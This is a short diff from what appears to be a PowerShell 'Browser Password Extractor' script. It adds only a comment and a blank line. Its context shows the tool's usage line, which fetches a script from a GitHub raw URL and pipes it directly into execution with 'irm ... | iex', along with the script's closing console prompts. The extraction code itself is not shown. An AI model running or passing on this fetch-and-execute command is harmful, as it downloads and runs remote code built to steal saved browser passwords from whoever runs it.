@@ -1,3 +1,4 @@
+#updated 
 # Browser Password Extractor - Fixed PowerShell Version
 # Usage: irm https://raw.githubusercontent.com/kalivarun/Script-Tools-/refs/heads/main/extract.txt | iex
 
@@ -372,3 +373,4 @@ try {
 Write-Host ""
 Write-Host "Press any key to exit..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
